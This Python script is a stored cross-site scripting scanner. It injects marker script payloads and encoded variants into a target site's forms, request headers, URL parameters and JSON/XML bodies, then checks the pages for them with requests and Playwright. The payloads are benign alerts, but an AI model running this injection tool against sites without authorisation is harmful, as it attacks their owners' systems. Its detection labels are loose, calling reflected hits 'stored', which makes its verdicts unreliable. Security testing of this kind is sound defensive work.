#final script
import requests
from bs4 import BeautifulSoup
import time
import json
import base64
import urllib.parse
import xml.etree.ElementTree as ET
from urllib.parse import urljoin, urlparse, parse_qs
from playwright.sync_api import sync_playwright

class StoredXSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerable_urls = []
        self.payload_counter = 0  
        self.payloads = self.generate_numbered_payloads()
        self.encoded_payloads = self.generate_encoded_payloads()
    
    def generate_numbered_payloads(self):
        base_payloads = [
            "<script>alert('XSS TEST {}')</script>",
            "<script>console.log('XSS TEST {}')</script>",
            "<script>document.write('XSS TEST {}')</script>",
        ]
        return [payload.format(i) for i, payload in enumerate(base_payloads, start=1)]
    
    def generate_encoded_payloads(self):
        encoded_payloads = []
        for payload in self.payloads:
            encoded_payloads.append(urllib.parse.quote(payload))  
            encoded_payloads.append(base64.b64encode(payload.encode()).decode())  
            encoded_payloads.append(payload.replace("<", "&lt;").replace(">", "&gt;")) 
        return encoded_payloads
    
    def safe_request(self, method, url, **kwargs):
        retries = 3
        for attempt in range(retries):
            try:
                response = self.session.request(method, url, **kwargs)
                return response
            except requests.exceptions.RequestException as e:
                print(f"[!] Request failed ({attempt+1}/{retries}): {e}")
                time.sleep(2)
        return None
    
    def crawl(self):
        response = self.safe_request("GET", self.target_url)
        if response is None:
            print("[-] Failed to fetch the target page. Skipping crawl.")
            return []
        soup = BeautifulSoup(response.text, 'html.parser')
        return soup.find_all('form')
    
    def inject_payload(self, form, payload):
        action = form.get('action')
        method = form.get('method', 'post').lower()
        inputs = form.find_all(['input', 'textarea'])
        
        data = {}
        hidden_fields = {}
        csrf_field = None
        
        for inp in inputs:
            field_name = inp.get('name')
            field_value = inp.get('value', '')
            
            if field_name:
                if inp.get('type') == 'hidden':
                    hidden_fields[field_name] = field_value
                if 'csrf' in field_name.lower():
                    csrf_field = field_name
        
        for inp in inputs:
            field_name = inp.get('name')
            if field_name and inp.get('type') != 'submit':
                if 'comment' in field_name.lower() or 'search' in field_name.lower():
                    data[field_name] = payload
                elif field_name == csrf_field:
                    data[field_name] = input("Enter CSRF token: ")
                else:
                    data[field_name] = input(f"Enter value for {field_name}: ")
        
        data.update(hidden_fields)
        
        if csrf_field and csrf_field not in data:
            return
        
        form_url = urljoin(self.target_url, action) if action else self.target_url
        
        headers = {
            'User-Agent': payload,
            'Referer': payload,
            'Origin': self.target_url,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        response = self.safe_request(method.upper(), form_url, data=data, headers=headers, allow_redirects=True)
        if response:
            time.sleep(5)
            self.crawl_for_stored_payloads(payload)
    
    def test_url_parameters(self, payload):
        parsed_url = urlparse(self.target_url)
        query_params = parse_qs(parsed_url.query)
        
        for param in query_params:
            test_params = query_params.copy()
            test_params[param] = payload
            new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
            
            response = self.safe_request("GET", new_url)
            if response and payload in response.text:
                print(f"[!!!] Stored XSS detected in URL parameter '{param}' at {new_url}")
                self.verify_payload_with_playwright(new_url, payload)
    
    def test_api_xss(self, payload):
        json_payload = json.dumps({"xss_test": payload})
        xml_payload = f"<xss_test>{payload}</xss_test>"
        
        headers_json = {'Content-Type': 'application/json'}
        headers_xml = {'Content-Type': 'application/xml'}
        
        json_response = self.safe_request("POST", self.target_url, data=json_payload, headers=headers_json)
        xml_response = self.safe_request("POST", self.target_url, data=xml_payload, headers=headers_xml)
        
        if json_response and payload in json_response.text:
            print(f"[!!!] Stored XSS detected in JSON API response: {self.target_url}")
            self.verify_payload_with_playwright(self.target_url, payload)
        
        if xml_response and payload in xml_response.text:
            print(f"[!!!] Stored XSS detected in XML API response: {self.target_url}")
            self.verify_payload_with_playwright(self.target_url, payload)
    
    def crawl_for_stored_payloads(self, payload):
        print("[+] Crawling to find stored payload execution...")
        response = self.safe_request("GET", self.target_url)
        if response and payload in response.text:
            print(f"[!!!] Stored XSS detected! Payload '{payload}' is present on {self.target_url}")
            self.verify_payload_with_playwright(self.target_url, payload)
    
    def verify_payload_with_playwright(self, url, payload):
        print(f"[+] Verifying payload execution using Playwright on {url}")
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context()
            page = context.new_page()
            try:
                page.goto(url, timeout=10000)
                page.wait_for_timeout(3000)
                if payload in page.content():
                    print(f"[!!!] Confirmed Stored XSS execution: {payload}")
                else:
                    print("[-] No XSS execution detected.")
            except Exception as e:
                print(f"[!] Error during Playwright execution: {e}")
            finally:
                browser.close()
    
    def run(self):
        forms = self.crawl()
        if not forms:
            return
        
        for payload in self.payloads + self.encoded_payloads:
            for form in forms:
                self.inject_payload(form, payload)
            self.test_url_parameters(payload)
            self.test_api_xss(payload)
            self.crawl_for_stored_payloads(payload)
        
if __name__ == "__main__":
    target = input("Enter target URL: ")
    scanner = StoredXSSScanner(target)
    scanner.run()
